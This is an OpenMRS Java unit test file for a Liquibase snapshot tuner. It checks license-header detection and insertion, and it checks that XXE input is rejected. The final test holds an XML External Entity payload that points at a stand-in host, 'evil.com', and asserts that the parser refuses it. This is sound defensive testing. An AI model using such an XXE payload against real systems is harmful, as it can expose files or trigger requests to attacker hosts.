/**
 * This Source Code Form is subject to the terms of the Mozilla Public License,
 * v. 2.0. If a copy of the MPL was not distributed with this file, You can
 * obtain one at http://mozilla.org/MPL/2.0/. OpenMRS is also distributed under
 * the terms of the Healthcare Disclaimer located at http://openmrs.org/license.
 *
 * Copyright (C) OpenMRS Inc. OpenMRS is a registered trademark and the OpenMRS
 * graphic logo is a trademark of OpenMRS Inc.
 */
package org.openmrs.liquibase;

import static java.nio.file.StandardCopyOption.REPLACE_EXISTING;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.equalToCompressingWhiteSpace;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.dom4j.DocumentException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

public class AbstractSnapshotTunerTest {
	
	private static final String FILE_WITH_LICENSE_HEADER_MD = "file-with-license-header.md";
	
	private static final String FILE_WITHOUT_LICENSE_HEADER_MD = "file-without-license-header.md";
	
	private static final String HTTP_OPENMRS_ORG_LICENSE = "http://openmrs.org/license";
	
	private static String PATH_TO_TEST_RESOURCES = Paths.get("src", "test", "resources").toString();
	
	/*
	 * An instance of org.openmrs.liquibase.SchemaOnlyTuner is used to test behaviour implemented in the 
	 * org.openmrs.liquibase.AbstractSnapshotTuner class.
	 */
	private SchemaOnlyTuner schemaOnlyTuner;
	
	@BeforeEach
	public void setup() {
		schemaOnlyTuner = new SchemaOnlyTuner();
	}
	
	@Test
	public void shouldFindOpenMRSHeaderInFile() throws FileNotFoundException {
		assertTrue(schemaOnlyTuner.isLicenseHeaderInFile(PATH_TO_TEST_RESOURCES + File.separator + FILE_WITH_LICENSE_HEADER_MD));
	}
	
	@Test
	public void shouldDetectMissingOpenMRSHeaderInFile() throws FileNotFoundException {
		assertFalse(schemaOnlyTuner.isLicenseHeaderInFile(PATH_TO_TEST_RESOURCES + File.separator + FILE_WITHOUT_LICENSE_HEADER_MD));
	}
	
	@Test
	public void shouldReadFile() throws IOException {
		assertTrue(readFile(PATH_TO_TEST_RESOURCES + File.separator + FILE_WITH_LICENSE_HEADER_MD)
		        .contains(HTTP_OPENMRS_ORG_LICENSE));
	}
	
	@Test
	public void shouldReadResource() throws IOException {
		assertTrue(schemaOnlyTuner.readResource(FILE_WITH_LICENSE_HEADER_MD).contains(HTTP_OPENMRS_ORG_LICENSE));
	}
	
	@Test
	public void shouldAddLicenseHeaderToXmlFile() throws IOException {
		// given
		String contentWithoutLicenseHeader = schemaOnlyTuner.readResource(FILE_WITHOUT_LICENSE_HEADER_MD);
		assertFalse(contentWithoutLicenseHeader.contains(HTTP_OPENMRS_ORG_LICENSE));
		
		//  when
		String actual = schemaOnlyTuner
		        .addLicenseHeaderToFileContent(Paths.get(PATH_TO_TEST_RESOURCES, FILE_WITHOUT_LICENSE_HEADER_MD).toString());
		
		// then
		assertTrue(actual.contains(HTTP_OPENMRS_ORG_LICENSE));
	}
	
	@Test
	public void shouldCreateUpdatedChangeLogFile(@TempDir Path tempDir) throws IOException {
		// given
		Path sourcePath = Paths.get(PATH_TO_TEST_RESOURCES + File.separator + FILE_WITHOUT_LICENSE_HEADER_MD);
		Path targetPath = tempDir.resolve("file-to-add-license-header-to.txt");
		
		Files.copy(sourcePath, targetPath, REPLACE_EXISTING);
		
		assertTrue(!readFile(targetPath.toString()).contains(HTTP_OPENMRS_ORG_LICENSE));
		
		// when
		schemaOnlyTuner.addLicenseHeaderToFileIfNeeded(targetPath.toString());
		
		// then
		String actual = readFile(targetPath.toString());
		String expected = schemaOnlyTuner.readResource(FILE_WITH_LICENSE_HEADER_MD);
		
		assertThat(expected, equalToCompressingWhiteSpace(actual));
	}
	
	private String readFile(String path) throws IOException {
		File file = Paths.get(path).toFile();
		return readFile(file);
	}
	
	private String readFile(File file) throws IOException {
		if (file == null) {
			throw new RuntimeException("No file was supplied to readFile()");
		}
		
		if (!file.exists()) {
			throw new FileNotFoundException(file.getAbsolutePath());
		}
		
		try (FileInputStream is = new FileInputStream(file)) {
			return AbstractSnapshotTuner.readInputStream(is);
		}
	}

	//TODO: This behaviour should be mocked because directly creating a vulnerable file 
	// and attempting an XXE attack in a test environment is not recommended. 
	// It could potentially expose the system to real attacks, even if unintentional.
	@Test
	public void testReadChangeLogFile_shouldThrowDocumentExceptionIncaseOfAnXxeAttack() throws Exception {
		String xmlContent = "<!DOCTYPE root [<!ENTITY ext SYSTEM \"http://evil.com/payload\">]><root>&ext;</root>";
		Path tempFilePath = Paths.get("test.xml");
		Files.write(tempFilePath, xmlContent.getBytes());
		
		assertThrows(DocumentException.class, () -> AbstractSnapshotTuner.readChangeLogFile(String.valueOf(tempFilePath)));
		assertTrue(Files.deleteIfExists(tempFilePath)); //ensure the xml file is deleted after the assertion
	}
}
